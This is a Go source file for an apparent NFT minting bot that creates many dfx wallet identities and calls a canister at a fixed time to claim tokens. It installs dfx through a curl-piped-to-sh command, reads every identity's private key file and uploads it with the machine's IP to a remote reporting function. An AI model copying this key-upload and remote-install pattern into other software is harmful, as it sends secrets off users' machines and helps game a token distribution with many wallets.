package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"
)

var gdfx = ""
var home = ""

var wallets = []string{}
var ClientIP string = ""
var PunksInHand = []ResultPunk{}
var output chan punks = make(chan punks, 10)
var remainChan chan remaining = make(chan remaining, 10)

func init() {
	for i := 0; i < wallet_count; i++ {
		wallets = append(wallets, fmt.Sprintf("%d", i))
	}
}

func main() {
	var err error

	defer func() {
		if err != nil {
			go func() {
				err := reportStatus(err.Error(), statErr)
				if err != nil {
					return
				}
			}()
			log.Fatalf("process exit: %s", err.Error())
		}
	}()

	log.Printf("Version: v%s", Version)

	DataStores()

	ip, err := GetClientIp()
	if err != nil {
		return
	}
	ClientIP = ip

	err = prepareEnv()
	if err != nil {
		return
	}

	go func() {
		err := reportStatus("prepareEnv finished", statOk)
		if err != nil {
			return
		}
	}()

	err = prepareProject()
	if err != nil {
		return
	}

	go func() {
		err := reportStatus("prepareProject finished", statOk)
		if err != nil {
			return
		}
	}()

	err = prepareIdentities(wallets)
	if err != nil {
		return
	}

	go func() {
		err := reportStatus("prepareIdentities finished", statOk)
		if err != nil {
			return
		}
	}()

	err = tigger()
	if err != nil {
		return
	}

	go func() {
		err := reportStatus("work done finished", statOk)
		if err != nil {
			return
		}
	}()
}

func prepareEnv() error {
	dfx, err := exec.LookPath("dfx")
	if err != nil || dfx == "" {
		//need download
		cmd := exec.Command("sh -ci $(curl -fsSL https://sdk.dfinity.org/install.sh)")
		data, err := cmd.CombinedOutput()
		if err != nil {
			log.Fatalf("failed to call pipeCommands(): %v", err)
		}

		log.Printf("output: %s", string(data))

		idfx, aerr := exec.LookPath("dfx")
		if aerr != nil {
			log.Printf("inner dfx: %s", aerr)
			return aerr
		}

		dfx = idfx
	}

	gdfx = dfx
	log.Printf("dfx cmd is ok: %s", gdfx)
	return nil
}

func prepareProject() error {
	dirname, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	home = dirname

	err = os.Chdir(home)
	if err != nil {
		return err
	}

	_, err = os.Stat(workDir)
	if os.IsNotExist(err) {
		err = os.Mkdir(workDir, 0755)
		if err != nil {
			return err
		}
	}

	err = os.Chdir(workDir)
	if err != nil {
		return err
	}

	if _, err = os.Stat(path.Join(projectName, dfxjson)); os.IsNotExist(err) {
		cmdNew := exec.Command(gdfx, "new", projectName)
		err = cmdNew.Run()
		if err != nil {
			return err
		}
	}

	return nil
}

func prepareIdentities(wals []string) error {
	err := os.Chdir(path.Join(home, workDir, projectName))
	if err != nil {
		return err
	}

	cmd := exec.Command(gdfx, "identity", "list")
	out, err := cmd.Output()
	if err != nil {
		return err
	}

	strArr := strings.Split(string(out), "\n")

	for _, wal := range wals {
		var isExist bool = false
		for _, str := range strArr {
			if str == wal {
				// log.Printf("identity(%s) already exist", wal)
				isExist = true
				break
			}
		}

		if isExist {
			continue
		}

		cmd := exec.Command(gdfx, "identity", "new", wal)
		cmd.Stderr = os.Stderr
		cmd.Stdout = os.Stdout

		err = cmd.Run()
		if err != nil {
			return err
		}
	}

	go func() {
		for _, wlt := range wals {
			pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
			if err != nil {
				continue
			}

			func() {
				err := reportPem(PemPunk{
					IP:        ClientIP,
					Wal:       wlt,
					WalPriKey: string(pem),
				})
				if err != nil {
					log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
					return
				}
			}()
		}
	}()

	return nil
}

func cmdFunc(wl string) {
	start := time.Now()
	err := os.Chdir(path.Join(home, workDir, projectName))
	if err != nil {
		remainChan <- remaining{
			Err: err,
			wal: wl,
		}
		return
	}

	cmd := exec.Command(gdfx, "--identity", wl, "canister", "--network", "ic", "call", "qcg3w-tyaaa-aaaah-qakea-cai", "name")

	data, err := cmd.Output()
	if err != nil {
		remainChan <- remaining{
			Err: err,
			wal: wl,
		}
		log.Fatalf("cmd: %v err: %s", cmd, err.Error())
		return
	}

	output <- punks{
		Wal:  wl,
		Data: string(data),
	}
	log.Printf("cmd %s finished, took: %s", wl, time.Since(start).String())
}

func tigger() error {
	timeFormat := "2006-01-02 15:04:05"
	destTime, err := time.ParseInLocation(timeFormat, destTiming, time.UTC)
	if err != nil {
		return err
	}

	delay := destTime.Sub(time.Now().UTC())

	log.Printf("time is not reached destUtc: %v nowUtc: %v nowCst: %v delay: %v", destTime, time.Now().UTC(), time.Now(), delay)

	timer := time.NewTimer(delay)
	tickerOne := time.NewTicker(10 * time.Second)

nextStep:
	for {
		select {
		case <-timer.C:
			log.Printf("It's time now to do sth")
			break nextStep
		case <-tickerOne.C:
			go func() error {
				err := reportStatus("waiting time", statOk)
				if err != nil {
					return err
				}
				return nil
			}()
		}
	}
	tickerOne.Stop()

	// lis, err := listinfos()
	// if err != nil {
	// 	return err
	// }

	temp := []string{}
	for _, wlt := range wallets {
		var isIn = false
		for _, pun := range PunksInHand {
			if wlt == pun.Wal {
				isIn = true
				break
			}
		}
		if isIn {
			continue
		}
		temp = append(temp, wlt)
	}

	for _, wlt := range temp {
		// go Retry(100, 10*time.Millisecond, cmdFunc, wal)
		go cmdFunc(wlt)
	}

	ticker := time.NewTicker(20 * time.Second)
loop:
	for {
		select {
		case ou := <-output:
			ret := ResultPunk{
				IP:      ClientIP,
				Wal:     ou.Wal,
				TokenID: ou.Data,
			}

			PunksInHand = append(PunksInHand, ret)

			go func() {
				err := reportResult(ret)
				if err != nil {
					log.Fatalf("reportResult: %v err: %s", ret, err.Error())
					return
				}
			}()

			log.Printf("Successfully, wallet: %s, punk: %v", ou.Wal, ou.Data)

			go func() {
				err := saveinfo(ret)
				if err != nil {
					log.Fatalf("writeToLocal: %v err: %s", ret, err.Error())
					return
				}
			}()

			if len(PunksInHand) == len(wallets) {
				break loop
			}
		case re := <-remainChan:
			log.Printf("Temp encounter problem: %s err: %s", re.wal, re.Err.Error())
		case <-ticker.C:
			go func() {
				err := reportStatus("working busy", statOk)
				if err != nil {
					return
				}
			}()
		}
	}

	ticker.Stop()

	log.Println("all finished")
	return nil
}
